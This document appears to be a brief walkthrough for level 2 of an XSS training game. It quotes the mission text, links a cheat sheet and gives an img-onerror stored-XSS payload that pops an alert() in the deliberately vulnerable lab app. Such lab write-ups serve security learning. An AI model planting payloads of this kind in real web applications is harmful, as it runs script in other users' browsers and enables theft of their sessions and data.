## Mission Description
```
Web applications often keep user data in server-side and, increasingly,
client-side databases and later display it to users.
No matter where such user-controlled data comes from, it should be handled carefully.
This level shows how easily XSS bugs can be introduced in complex apps
```
## Mission Objective
```
Inject a script to pop up an alert() in the context of the application.
Note: the application saves your posts so if you sneak in code to execute the alert,
this level will be solved every time you reload it.
```

## XSS_Level2
**Cheat sheet:**
```
https://gist.github.com/kurobeats/9a613c9ab68914312cbb415134795b45
```
**Inject the payload:**

There are many ways to do this. One approach is use the following command
and paste on the submission field.

``
"><img src=x onerror=javascript:alert(`XssLevel2`)>
``

![](/XSS_Game/Level2/Img/Xss_Level2.png)

## Congratulation!
![](/XSS_Game/Level2/Img/Result.png)

